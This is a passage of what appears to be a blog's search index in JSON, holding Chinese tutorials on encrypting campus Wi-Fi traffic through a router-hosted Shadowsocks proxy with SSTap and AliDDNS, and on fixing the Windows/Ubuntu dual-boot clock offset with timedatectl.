\u53d8\u6210\uff1a 1 2 3 arIpAddress () { ifconfig | grep inet | grep -oE '172\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' | head -n1 } Warning \u7531\u4e8e\u5185\u7f51\u7f51\u6bb5\u662f172\u5f00\u5934\u7684\uff0c\u8fd9\u6837\u5b50\u8fc7\u6ee4\u53ef\u4ee5\u6bd4\u8f83\u7701\u4e8b\u3002\u5f53\u7136\u4f60\u8981\u662f\u6240\u5904\u7684\u7f51\u7edc\u73af\u5883\u4e0d\u4e00\u6837\u7684\u8bdd\uff0c\u8fd9\u6837\u505a\u662f\u6ca1\u6cd5\u5f97\u5230\u6b63\u786e\u7ed3\u679c\u7684\uff0c\u4f60\u53ef\u4ee5\u6539\u4e00\u4e0b\u6b63\u5219\u7136\u540e\u5230\u63a7\u5236\u53f0\u4e0a\u5c1d\u8bd5\u4e00\u4e0b\u518d\u628a\u53ef\u7528\u7684\u547d\u4ee4\u586b\u5230\u8fd9\u91cc\u3002 \u6709\u70b9\u6295\u673a\u53d6\u5de7\u7684\u6837\u5b50\uff0c\u4e0d\u8fc7\u4f60\u6709\u66f4\u597d\u7684\u65b9\u6cd5\u7684\u8bdd\u53ef\u4ee5\u628a\u5b83\u6362\u6389\uff0c\u80fd\u987a\u4fbf\u544a\u8bc9\u6211\u5c31\u66f4\u597d\u5566\u3002 \u522b\u5fd8\u8bb0\u4e86\u5148\u6d4b\u8bd5\u662f\u5426\u53ef\u884c\uff0c\u6bd4\u5982\u5728 \u7cfb\u7edf\u7ba1\u7406-\u63a7\u5236\u53f0 \u6216\u662fSSH\u4e0a\u6d4b\u8bd5\u597d\uff0c\u786e\u8ba4\u5df2\u7ecf\u80fd\u8fd4\u56de\u6b63\u786e\u7684\u5185\u7f51\u5730\u5740\uff0c\u518d\u628a\u5b83\u586b\u8fdb\u811a\u672c\u4e2d\u4fdd\u5b58\u3002 \u8fd9\u4e2a\u65f6\u5019\u4f60\u5e94\u8be5\u53ef\u4ee5\u542f\u52a8DDNS\u4e86\u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4f60\u80fd\u4ece \u53f3\u4e0a\u65b9\u7684\u65e5\u5fd7\u6309\u94ae \u6216\u662f\u5de6\u4fa7\u680f\u7684 \u7cfb\u7edf\u65e5\u5fd7 \u8fdb\u5165\u5e76\u770b\u5230\u6709\u5173Aliddns\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u68c0\u6d4b\u5230\u672c\u5730IP\u4e0eDNS\u89e3\u6790\u8bb0\u5f55\u4e0d\u7b26\uff0c\u5e76\u4e14\u6b63\u786e\u5730\u66f4\u65b0\u4e86\u57df\u540d\u6307\u5411\u3002\u8fd9\u5e94\u8be5\u8bc1\u660e\u914d\u7f6e\u662f\u6b63\u786e\u7684\u3002 \u5e94\u8be5\u80fd\u5728\u65e5\u5fd7\u91cc\u627e\u5230\u7c7b\u4f3c\u8fd9\u6837\u7684\u5185\u5bb9\uff1a 1 2 3 4 5 6 7 Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u5f00\u59cb\u66f4\u65b0 xxx . xxx . xxx \u57df\u540d IP \u6307\u5411 Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u76ee\u524d IP : xxx . xxx . xxx . xxx Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u4e0a\u6b21 IP : Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u66f4\u65b0\u7684\u8bb0\u5f55 xxxxxxxxxxxxxxxxx Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u6210\u529f\u66f4\u65b0\uff1a xxx . xxx . xxx . xxx Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u66f4\u65b0\u52a8\u6001 DNS\u8bb0\u5f55\u6210\u529f \uff01 Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u5b88\u62a4\u8fdb\u7a0b\u542f\u52a8 \u8fd9\u5c31\u5927\u529f\u544a\u6210\u4e86\u3002 \u5e9f\u8bdd\u4e00\u53e5\uff0c\u4f60\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u907f\u514d\u8fdc\u7a0b\u63a7\u5236\u8fd8\u9700\u8981\u8bb0\u5fc6IP\uff0c\u4e0d\u7ba1\u4f60\u662f\u5426\u5728\u7528\u8def\u7531\u5668\uff0c\u9053\u7406\u662f\u5dee\u4e0d\u591a\u7684\u3002 \u989d\u5916\u7684\u52a0\u6210 \u6216\u8bb8\u4f60\u5df2\u7ecf\u77e5\u9053\u6559\u5b66\u533a\u57df\u5185\u9650\u5236\u6bcf\u4eba\u51fa\u53e3\u6700\u9ad820M\u4e0b\u884c4M\u4e0a\u884c\uff0c\u5bbf\u820d\u533a\u57df\u662f\u4e0a\u4e0b\u884c\u5bf9\u7b49\u7684\u3002\u4e00\u65e6\u4f7f\u7528\u4e0a\u8ff0\u65b9\u6cd5\uff0c\u5728\u6559\u5b66\u533a\u4e5f\u80fd\u6709\u548c\u5728\u5bbf\u820d\u4e00\u6837\u7684\u901f\u5ea6\u3002\u53e6\u5916\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u673a\u623f\u7684\u5916\u7f51\u51fa\u53e3\u62e5\u6324\u65f6\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u80fd\u83b7\u5f97\u6b63\u5e38\u7684\u7f51\u7edc\u901f\u5ea6\u3002","title":"\u5728\u5f00\u653e\u7684\u6821\u56ed\u65e0\u7ebf\u7f51\u7edc\u4e2d\u52a0\u5bc6\u81ea\u5df1\u7684\u6570\u636e\u4f20\u8f93"},{"location":"misc/secure_public_wireless_network_at_school_szu/#_1","text":"\u9996\u5148\uff0c\u8ba9\u6211\u4eec\u5148\u542f\u52a8\u4e00\u4e0b\u8fd9\u4e2a\u670d\u52a1\u5668\u3002 \u52a0\u5bc6\u65b9\u5f0f\u9009\u62e9\u540e\u8981\u8bb0\u4f4f\uff0c\u4e4b\u540e\u8981\u8fde\u63a5\u7684\u65f6\u5019\u8981\u586b\u3002\u5bc6\u7801\u5c3d\u91cf\u591f\u957f\u591f\u590d\u6742\uff0c\u5e76\u4e14\u5c3d\u91cf\u4e0d\u8981\u4e0e\u5176\u5b83\u5bc6\u7801\u91cd\u590d\u3002\u8fd8\u6709UDP\u8f6c\u53d1\u3002 \u6253\u5f00\u5f00\u5173\uff0c\u5e94\u7528\u672c\u9875\u9762\u8bbe\u7f6e\u3002\u5e94\u8be5\u57fa\u672c\u7684\u8bbe\u7f6e\u662f\u5b8c\u6210\u4e86\u3002","title":"\u51c6\u5907\u597d\u8def\u7531\u5668\u4e0a\u7684\u914d\u7f6e"},{"location":"misc/secure_public_wireless_network_at_school_szu/#windows","text":"\u5047\u8bbe\u4f60\u6b63\u5728\u4f7f\u7528Windows\u3002\u6709\u4e2a\u4f3c\u4e4e\u6709\u70b9\u5e74\u5934\u7684\u8f6f\u4ef6\uff1aSS-Tap\uff0c\u8fd9\u4f3c\u4e4e\u4e0d\u662f\u4e2a\u5f88\u597d\u7684\u9009\u62e9\uff1f\u4f46\u662f\u5e73\u5e38\u7528\u7528\u4f53\u9a8c\u8fd8\u662f\u53ef\u4ee5\u7684\u3002 Tip \u6700\u65b0\u7248\u672c\uff081.1.0.1\uff09\u53bb\u6389\u4e86\u5168\u5c40\u89c4\u5219\uff0c\u5f00\u59cb\u4e13\u5fc3\u5730\u505a\u4e00\u4e2a\u6e38\u620f\u52a0\u901f\u5668\u4e86\uff08\uff1f\uff09\uff0c\u81ea\u884c\u6dfb\u52a0\u7684\u5168\u5c40\u89c4\u5219\u4e5f\u4f1a\u88ab\u6539\u6389\u3002\u4e3a\u4e86\u8ba9\u6211\u4eec\u5168\u90e8\u7684\u6d41\u91cf\u90fd\u4e0d\u4f1a\u66b4\u9732\u5728\u5f00\u653e\u7684\u65e0\u7ebf\u516c\u5171\u7f51\u7edc\u4e0a\uff0c\u6240\u4ee5\u9700\u8981\u6e9c\u5230\u7a0b\u5e8f\u7684\u89c4\u5219\u76ee\u5f55\u4e0b\u628a\u89c4\u5219\u6539\u4e86\u3002\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u9009\u62e9\u65e7\u7248\uff0c\u636e\u4f20\u7248\u672c\u53f7\u4e3a1.0.9.7\u7684\u7a0b\u5e8f\u4ecd\u7136\u6709\u5168\u5c40\u89c4\u5219\u3002 \u5047\u88c5\u4f60\u5df2\u7ecf\u628a\u5b83\u88c5\u597d\u4e86\u5e76\u4e14\u6ca1\u6709\u9047\u5230\u4ec0\u4e48\u95ee\u9898\u3002\u90a3\u4e48\u8ba9\u6211\u4eec\u6765\u914d\u7f6e\u4e00\u4e0b\uff1a \u7531\u4e8e\u6211\u4eec\u5728\u8def\u7531\u7aef\u542f\u52a8\u7684\u662fss\uff0c\u6240\u4ee5\uff0c\u6dfb\u52a0\u4e00\u4e2aS/R\uff1a \u73b0\u5728\u5b66\u6821IP\u5730\u5740\u7684\u79df\u7ea6\u7adf\u7136\u662f10\u5206\u949f\uff0c\u5e0c\u671b\u4f60\u5728\u51fa\u95e8\u524d\u5df2\u7ecf\u4e8b\u5148\u770b\u597d\u5e76\u8bb0\u4f4f\u4e86\u8def\u7531\u5668\u7684IP\u5730\u5740\uff08\u5f53\u7136\uff0c\u6211\u8fd9\u4e48\u61d2\uff0c\u80af\u5b9a\u662f\u4e0d\u4f1a\u8fd9\u6837\u505a\u7684\uff0c\u4e0b\u6587\u4f1a\u5206\u4eab\u6211\u7684\u89e3tou\u51b3lan\u65b9\u6cd5\uff09\uff0c\u628a\u5b83\u586b\u8fdb \u670d\u52a1\u5668IP \u4e00\u680f\uff0c \u7aef\u53e3 \u3001 \u5bc6\u7801 \u3001 \u52a0\u5bc6\u65b9\u5f0f \u548c\u8def\u7531\u5668\u4e0a\u4fdd\u6301\u4e00\u81f4\u5373\u53ef\u3002 \u56e0\u4e3a\u6211\u4eec\u9700\u8981\u6570\u636e\u5728\u5f00\u653e\u7684\u7f51\u7edc\u4e2d\u4fdd\u8bc1\u5b89\u5168\uff0c\u6240\u4ee5\u6211\u4eec\u81ea\u7136\u66f4\u5e0c\u671b\u8fd9\u662f\u5168\u5c40\u7684\u4ee3\u7406\u3002\u53ef\u60dc\u8fd9\u8f6f\u4ef6\u7684\u6700\u540e\u4e00\u4e2a\u7248\u672c\u6ca1\u6709\uff0c\u6211\u4eec\u6765\u521b\u4e00\u4e2a\uff1a \u4e2d\u82f1\u6587\u540d\u5b57\u968f\u4fbf\u8d77\uff0c\u8bb0\u4f4f\u5c31\u597d\u3002\u522b\u5fd8\u4e86\u7c7b\u578b\u5f97\u662f \u4ee3\u7406 \u3002\u89c4\u5219\u5148\u586b\u4e0a 0.0.0.0/0 \u3002\u7136\u540e\u4fdd\u5b58\u3002 \u5370\u8c61\u4e2d\uff0c\u8fd9\u4e2a\u81ea\u5df1\u5199\u7684\u6709\u70b9\u95ee\u9898\u7684\u5168\u5c40\u7684\u89c4\u5219\u4f1a\u88ab\u6539\u5199\u3002\u6211\u4eec\u5230\u5b83\u6240\u5728\u7684\u5730\u65b9\uff08\u5e94\u8be5\u5728\u4e2a\u4eba\u6587\u4ef6\u5939\u4e0b\u7684/AppData/Local/SSTap-beta/rules\u4e2d\uff09\u76f4\u63a5\u6539\u5b83\uff1a \u597d\u4e86\uff0c\u5fd9\u6d3b\u4e86\u534a\u5929\uff0c\u7ec8\u4e8e\u53ef\u4ee5\u5f00\u59cb\u8fde\u63a5\u4e86\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u8fde\u63a5\u4e0aSZU_WLAN\u5e76\u901a\u8fc7\u4e86\u65e0\u7ebf\u51c6\u5165\u8ba4\u8bc1\uff0c\u70b9\u51fb\u4e3b\u754c\u9762\u7684\u8fde\u63a5\u5c31\u53ef\u4ee5\u8fde\u4e0a\u4e86\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u5982\u679c\u80fd\u8bbf\u95ee\u8def\u7531\u5668\u7684\u7ba1\u7406\u9875\u9762\uff0c\u8bf4\u660e\u914d\u7f6e\u5e94\u8be5\u662f\u6b63\u786e\u7684\u3002","title":"Windows\u4e0b\u8fde\u63a5"},{"location":"misc/secure_public_wireless_network_at_school_szu/#ddnsip","text":"\u5176\u5b9e\u6211\u4e00\u76f4\u5728\u60f3\u4e00\u4ef6\u4e8b\uff1a\u90a3\u4e9b\u5929\u5929\u5728\u7528\u5185\u7f51IP\u8fdc\u7a0b\u63a7\u5236\u7684\u540c\u5b66\u4eec\uff0c\u6bcf\u5929\u51fa\u95e8\u770bIP\u3001\u63d0\u5fc3\u540a\u80c6\u6015IP\u53d8\u52a8\u3001\u5b9e\u5728\u4e0d\u884c\u8fd8\u8981\u5f00\u4e2aTeamViewer\u6765\u770b\u770bIP\uff0c\u4e0d\u662f\u5f88\u7d2f\u5417... \u4f60\u53ef\u80fd\u6309\u7167\u4e0a\u6587\u914d\u7f6e\u597d\u4e86\u670d\u52a1\uff0c\u4f46\u662f\u6bcf\u5929\u8981\u8fde\u63a5\u7684\u65f6\u5019\u90fd\u8981\u6539\u4e00\u4e0b\u8f6f\u4ef6\u4e2d\u7684\u670d\u52a1\u5668IP\u3002\u66f4\u8981\u547d\u7684\u662f\uff0c\u51fa\u95e8\u8981\u68c0\u67e5\u7684\u4e0d\u4ec5\u662f\u624b\u673a\u6821\u5361\uff0c\u8fd8\u5f97\u770b\u770b\u4eca\u5929\u7684IP\u662f\u5565\uff0c\u8981\u662f\u4eca\u5929\u8fd0\u6c14\u4e0d\u597dIP\u53d8\u5316\u4e86\uff0c\u4e0d\u56de\u5bbf\u820d\u4e00\u8d9f\u597d\u50cf\u8fd8\u5c31\u90fd\u8fde\u4e0d\u4e0a\u4e86\u3002\u522b\u614c\uff0c\u8fd9\u4e2a\u56fa\u4ef6\u91cc\u6709\u8fd9\u4e2a\u4e1c\u897f\uff1a \u5982\u679c\u4f60\u6709\u4e00\u4e2a\u57df\u540d\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u7a0b\u5e8f\u6765\u5e2e\u4f60\u5728IP\u5730\u5740\u53d8\u52a8\u65f6\uff0c\u81ea\u52a8\u5730\u5c06\u57df\u540d\u7684\u67d0\u4e2a\u89e3\u6790\u8bb0\u5f55\u66f4\u65b0\u6210\u65b0\u7684IP\u5730\u5740\u3002\u8fd9\u5c31\u610f\u5473\u7740\uff0c\u5e73\u65f6\u53ea\u9700\u8981\u8bb0\u4f4f\u81ea\u5df1\u7684\u57df\u540d\uff0c\u5269\u4e0b\u7684\u5c31\u4ea4\u7ed9DDNS\u6765\u89e3\u51b3\u5c31\u597d\u4e86\u3002 \u8fd9\u4e2a\u56fa\u4ef6\u6709\u5b9e\u73b0\u4e86\u591a\u4e2a\u5382\u5546\u7684DDNS\u7684\u7a0b\u5e8f\u3002\u4f60\u53ef\u4ee5\u9009\u62e9\u4e00\u4e2a\u5bf9\u5e94\u7684\u6765\u7528\u3002\u6211\u6b63\u5728\u7528Aliddns\uff0c\u9996\u5148\u9700\u8981\u5230\u963f\u91cc\u7684\u63a7\u5236\u53f0\u4e0a \u65b0\u589e\u4e00\u6761\u89e3\u6790\u8bb0\u5f55 \uff08\u5148\u968f\u4fbf\u6307\u5411\u4e00\u4e2a\u5185\u7f51\u5730\u5740\uff09\uff0c\u7136\u540e\u8981\u6709 accesskeys \uff0c\u8fd9\u4e9b\u963f\u91cc\u4e91\u7684\u5b98\u65b9\u6587\u6863\u91cc\u90fd\u6709\uff0c\u5e94\u8be5\u4e0d\u7528\u6211\u8bf4\u4e86...\u5148\u628a\u8fd9\u4e9b\u4fe1\u606f\u586b\u8fdbAliddns\u4fdd\u5b58\u3002 \u5bf9\u4e86\uff0c\u5982\u679c\u4f60\u8fde\u57df\u540d\u90fd\u6ca1\u6709\uff0c\u5148\u53bb\u4e70\u4e00\u4e2a\u5427\u3002\u6700\u597d\u662f\u56fa\u4ef6\u91cc\u90a3\u4e9b\u811a\u672c\u652f\u6301\u7684\uff0c\u4e0d\u7136\u53ef\u80fd\u8981\u6298\u817e\u534a\u5929... \u7136\u540e\uff0c\u70b9\u5f00\u4e0b\u65b9\u83b7\u53d6IP\u7684\u811a\u672c\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539\u5b83\u3002\u539f\u672c\u7684\u811a\u672c\u5e94\u8be5\u662f\u83b7\u53d6\u4e86IPv4\u51fa\u53e3\u5730\u5740\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u662f\u6211\u4eec\u76ee\u524d\u8fd9\u4e2a\u60c5\u51b5\u4e0b\u60f3\u8981\u7684\u3002\u6211\u4eec\u5e0c\u671b\u5b83\u662f\u5185\u7f51\u7684\u5730\u5740\uff0c\u6240\u4ee5\uff0c\u628a\u5b83\u6539\u6210\u4ece\u672c\u5730\u83b7\u53d6\u5730\u5740\uff0c\u5e76\u8fc7\u6ee4\u4e00\u4e0b\uff0c\u5c31\u50cf\u8fd9\u6837: \u4ece\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # \u81ea\u884c\u6d4b\u8bd5\u54ea\u4e2a\u4ee3\u7801\u80fd\u83b7\u53d6\u6b63\u786e\u7684IP\uff0c\u5220\u9664\u524d\u9762\u7684#\u53ef\u751f\u6548 arIpAddress () { # IPv4\u5730\u5740\u83b7\u53d6 # \u83b7\u5f97\u5916\u7f51\u5730\u5740 #curltest=`which curl` #if [ -z \"$curltest\" ] || [ ! -s \"`which curl`\" ] ; then #wget --no-check-certificate --quiet --output-document=- \"https://www.ipip.net\" | grep \"IP\u5730\u5740\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #wget --no-check-certificate --quiet --output-document=- \"http://members.3322.org/dyndns/getip\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #wget --no-check-certificate --quiet --output-document=- \"ip.6655.com/ip.aspx\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #wget --no-check-certificate --quiet --output-document=- \"ip.3322.net\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #else #curl -L -k -s \"https://www.ipip.net\" | grep \"IP\u5730\u5740\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #curl -k -s \"http://members.3322.org/dyndns/getip\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #curl -k -s ip.6655.com/ip.aspx | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #curl -k -s ip.3322.net | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #fi } \u53d8\u6210\uff1a 1 2 3 arIpAddress () { ifconfig | grep inet | grep -oE '172\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' | head -n1 } Warning \u7531\u4e8e\u5185\u7f51\u7f51\u6bb5\u662f172\u5f00\u5934\u7684\uff0c\u8fd9\u6837\u5b50\u8fc7\u6ee4\u53ef\u4ee5\u6bd4\u8f83\u7701\u4e8b\u3002\u5f53\u7136\u4f60\u8981\u662f\u6240\u5904\u7684\u7f51\u7edc\u73af\u5883\u4e0d\u4e00\u6837\u7684\u8bdd\uff0c\u8fd9\u6837\u505a\u662f\u6ca1\u6cd5\u5f97\u5230\u6b63\u786e\u7ed3\u679c\u7684\uff0c\u4f60\u53ef\u4ee5\u6539\u4e00\u4e0b\u6b63\u5219\u7136\u540e\u5230\u63a7\u5236\u53f0\u4e0a\u5c1d\u8bd5\u4e00\u4e0b\u518d\u628a\u53ef\u7528\u7684\u547d\u4ee4\u586b\u5230\u8fd9\u91cc\u3002 \u6709\u70b9\u6295\u673a\u53d6\u5de7\u7684\u6837\u5b50\uff0c\u4e0d\u8fc7\u4f60\u6709\u66f4\u597d\u7684\u65b9\u6cd5\u7684\u8bdd\u53ef\u4ee5\u628a\u5b83\u6362\u6389\uff0c\u80fd\u987a\u4fbf\u544a\u8bc9\u6211\u5c31\u66f4\u597d\u5566\u3002 \u522b\u5fd8\u8bb0\u4e86\u5148\u6d4b\u8bd5\u662f\u5426\u53ef\u884c\uff0c\u6bd4\u5982\u5728 \u7cfb\u7edf\u7ba1\u7406-\u63a7\u5236\u53f0 \u6216\u662fSSH\u4e0a\u6d4b\u8bd5\u597d\uff0c\u786e\u8ba4\u5df2\u7ecf\u80fd\u8fd4\u56de\u6b63\u786e\u7684\u5185\u7f51\u5730\u5740\uff0c\u518d\u628a\u5b83\u586b\u8fdb\u811a\u672c\u4e2d\u4fdd\u5b58\u3002 \u8fd9\u4e2a\u65f6\u5019\u4f60\u5e94\u8be5\u53ef\u4ee5\u542f\u52a8DDNS\u4e86\u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4f60\u80fd\u4ece \u53f3\u4e0a\u65b9\u7684\u65e5\u5fd7\u6309\u94ae \u6216\u662f\u5de6\u4fa7\u680f\u7684 \u7cfb\u7edf\u65e5\u5fd7 \u8fdb\u5165\u5e76\u770b\u5230\u6709\u5173Aliddns\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u68c0\u6d4b\u5230\u672c\u5730IP\u4e0eDNS\u89e3\u6790\u8bb0\u5f55\u4e0d\u7b26\uff0c\u5e76\u4e14\u6b63\u786e\u5730\u66f4\u65b0\u4e86\u57df\u540d\u6307\u5411\u3002\u8fd9\u5e94\u8be5\u8bc1\u660e\u914d\u7f6e\u662f\u6b63\u786e\u7684\u3002 \u5e94\u8be5\u80fd\u5728\u65e5\u5fd7\u91cc\u627e\u5230\u7c7b\u4f3c\u8fd9\u6837\u7684\u5185\u5bb9\uff1a 1 2 3 4 5 6 7 Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u5f00\u59cb\u66f4\u65b0 xxx . xxx . xxx \u57df\u540d IP \u6307\u5411 Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u76ee\u524d IP : xxx . xxx . xxx . xxx Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u4e0a\u6b21 IP : Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u66f4\u65b0\u7684\u8bb0\u5f55 xxxxxxxxxxxxxxxxx Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u6210\u529f\u66f4\u65b0\uff1a xxx . xxx . xxx . xxx Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u66f4\u65b0\u52a8\u6001 DNS\u8bb0\u5f55\u6210\u529f \uff01 Month Day Hour : Minute : Second \u3010 AliDDNS\u52a8\u6001\u57df\u540d \u3011 : \u5b88\u62a4\u8fdb\u7a0b\u542f\u52a8 \u8fd9\u5c31\u5927\u529f\u544a\u6210\u4e86\u3002 \u5e9f\u8bdd\u4e00\u53e5\uff0c\u4f60\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u907f\u514d\u8fdc\u7a0b\u63a7\u5236\u8fd8\u9700\u8981\u8bb0\u5fc6IP\uff0c\u4e0d\u7ba1\u4f60\u662f\u5426\u5728\u7528\u8def\u7531\u5668\uff0c\u9053\u7406\u662f\u5dee\u4e0d\u591a\u7684\u3002","title":"\u5229\u7528DDNS\u6765\u8ba9\u4f60\u4e0d\u9700\u8981\u518d\u8bb0\u5fc6IP\u5730\u5740"},{"location":"misc/secure_public_wireless_network_at_school_szu/#_2","text":"\u6216\u8bb8\u4f60\u5df2\u7ecf\u77e5\u9053\u6559\u5b66\u533a\u57df\u5185\u9650\u5236\u6bcf\u4eba\u51fa\u53e3\u6700\u9ad820M\u4e0b\u884c4M\u4e0a\u884c\uff0c\u5bbf\u820d\u533a\u57df\u662f\u4e0a\u4e0b\u884c\u5bf9\u7b49\u7684\u3002\u4e00\u65e6\u4f7f\u7528\u4e0a\u8ff0\u65b9\u6cd5\uff0c\u5728\u6559\u5b66\u533a\u4e5f\u80fd\u6709\u548c\u5728\u5bbf\u820d\u4e00\u6837\u7684\u901f\u5ea6\u3002\u53e6\u5916\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u673a\u623f\u7684\u5916\u7f51\u51fa\u53e3\u62e5\u6324\u65f6\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u80fd\u83b7\u5f97\u6b63\u5e38\u7684\u7f51\u7edc\u901f\u5ea6\u3002","title":"\u989d\u5916\u7684\u52a0\u6210"},{"location":"misc/time_issue_when_dual_systems_windows_and_ubuntu/","text":"\u4ee5\u524d\u90fd\u5728\u6298\u817eopenSUSE\uff0c\u5728\u5b89\u88c5\u7684\u65f6\u5019\u80fd\u9009\u62e9\u662f\u5426 Hardware Clock Set to UTC \uff0c\u5c31\u6ca1\u592a\u5173\u6ce8\u8fd9\u4e2a\u95ee\u9898\uff0c\u8fd9\u56de\u641e\u4e86\u4e0bUbuntu 19.04\u53d1\u73b0\u65f6\u95f4\u6709\u70b9\u5c0f\u95ee\u9898\uff0cUbuntu\u6bcf\u6b21\u5f00\u673a\u90fd\u4f1a\u81ea\u52a8\u540c\u6b65\u65f6\u95f4\uff0c\u56de\u5230Windows\u4e0b\u4e4b\u540e\u65f6\u95f4\u5c31\u4e0d\u5bf9\u4e86\uff0c\u5373\u4f7fWindows\u4e0b\u8bbe\u7f6e\u4e86\u81ea\u52a8\u540c\u6b65\u4e5f\u4e0d\u4e00\u5b9a\u80fd\u53ca\u65f6\u540c\u6b65\u3002\u4e3b\u8981\u539f\u56e0\u6458\u6284\u4e00\u4e0b\uff1a UTC\u5373Universal Time Coordinated\uff0c\u534f\u8c03\u4e16\u754c\u65f6\uff08\u4e16\u754c\u7edf\u4e00\u65f6\u95f4\uff09 GMT \u5373Greenwich Mean Time\uff0c\u683c\u6797\u5c3c\u6cbb\u5e73\u65f6 Windows \u4e0e Mac/Linux \u770b\u5f85\u7cfb\u7edf\u786c\u4ef6\u65f6\u95f4\u7684\u65b9\u5f0f\u662f\u4e0d\u4e00\u6837\u7684\uff1a Windows\u628a\u8ba1\u7b97\u673a\u786c\u4ef6\u65f6\u95f4\u5f53\u4f5c\u672c\u5730\u65f6\u95f4(local time)\uff0c\u6240\u4ee5\u5728Windows\u7cfb\u7edf\u4e2d\u663e\u793a\u7684\u65f6\u95f4\u8ddfBIOS\u4e2d\u663e\u793a\u7684\u65f6\u95f4\u662f\u4e00\u6837\u7684\u3002 Linux/Unix/Mac\u628a\u8ba1\u7b97\u673a\u786c\u4ef6\u65f6\u95f4\u5f53\u4f5c UTC\uff0c \u6240\u4ee5\u5728Linux/Unix/Mac\u7cfb\u7edf\u542f\u52a8\u540e\u5728\u8be5\u65f6\u95f4\u7684\u57fa\u7840\u4e0a\uff0c\u52a0\u4e0a\u7535\u8111\u8bbe\u7f6e\u7684\u65f6\u533a\u6570\uff08 \u6bd4\u5982\u6211\u4eec\u5728\u4e2d\u56fd\uff0c\u5b83\u5c31\u52a0\u4e0a\u201c8\u201d \uff09\uff0c\u56e0\u6b64\uff0cLinux/Unix/Mac\u7cfb\u7edf\u4e2d\u663e\u793a\u7684\u65f6\u95f4\u603b\u662f\u6bd4Windows\u7cfb\u7edf\u4e2d\u663e\u793a\u7684\u65f6\u95f4\u5feb8\u4e2a\u5c0f\u65f6\u3002 \u6240\u4ee5\uff0c\u5f53\u4f60\u5728Linux/Unix/Mac\u7cfb\u7edf\u4e2d\uff0c\u628a\u7cfb\u7edf\u73b0\u5b9e\u7684\u65f6\u95f4\u8bbe\u7f6e\u6b63\u786e\u540e\uff0c\u5176\u5b9e\u8ba1\u7b97\u673a\u786c\u4ef6\u65f6\u95f4\u662f\u5728\u8fd9\u4e2a\u65f6\u95f4\u4e0a\u51cf\u53bb8\u5c0f\u65f6\uff0c\u6240\u4ee5\u5f53\u4f60\u5207\u6362\u6210Windows\u7cfb\u7edf\u540e\uff0c\u4f1a\u53d1\u73b0\u65f6\u95f4\u6162\u4e868\u5c0f\u65f6\u3002\u5c31\u662f\u8fd9\u6837\u4e2a\u539f\u56e0\u3002 \u4f5c\u8005\uff1a\u6ed1\u7a3d \u94fe\u63a5\uff1a https://www.zhihu.com/question/46525639/answer/157272414 \u6765\u6e90\uff1a\u77e5\u4e4e \u8457\u4f5c\u6743\u5f52\u4f5c\u8005\u6240\u6709\u3002\u5546\u4e1a\u8f6c\u8f7d\u8bf7\u8054\u7cfb\u4f5c\u8005\u83b7\u5f97\u6388\u6743\uff0c\u975e\u5546\u4e1a\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u3002 \u4e3a\u4e86\u4fee\u590d\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u4fee\u6539Ubuntu\u7684\u7b56\u7565\uff1a 1 sudo timedatectl set-local-rtc 1 --adjust-system-clock \u5e94\u8be5\u5c31\u80fd\u89e3\u51b3\u3002\u5176\u4e2d\uff1a Since Ubuntu 16.04 timedatectl / timesyncd (which are part of systemd) replace most of ntpdate / ntp. timesyncd is available by default and replaces not only ntpdate, but also the client portion of chrony (or formerly ntpd). So 